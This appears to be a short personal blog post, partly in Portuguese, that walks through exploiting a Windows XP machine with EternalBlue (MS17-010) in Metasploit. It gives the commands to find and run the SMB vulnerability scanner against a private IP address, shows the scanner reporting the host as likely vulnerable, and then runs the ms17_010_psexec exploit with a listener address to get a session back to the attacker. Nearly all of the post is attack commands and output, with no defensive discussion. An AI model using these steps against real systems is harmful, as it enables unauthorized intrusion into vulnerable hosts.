---
title: Exploit 0x00
category: post
---

EternalBlue WindowsXP
-----------------------




### Enter msfconsole and search vuln

		msfconsole

		search eternalblue

OR

		search ms17-010

---

### Primeiramente Verificamos se a maquina de destino eh um Windows XP Vuln

	use auxiliary/scanner/smb/smb_ms17_010

	set RHOST 10.l0.1.4

	exploit

Se tudo der certo, obtemos uma resposta parecida com o seguinte:

		[+] 10.l0.1.4:445      - Host is likely VULNERABLE to MS17-010! - Windows 5.1
		[*] 10.l0.1.4:445      - Scanned 1 of 1 hosts (100% complete)
		[*] Auxiliary module execution completed

---

## Agora Vamos Explorar a maquina que identificamos que esta vulneravel


	back

	use exploit/windows/smb/ms17_010_psexec

	set RHOST 10.l0.1.4

	set LHOST 10.l0.1.2

	run
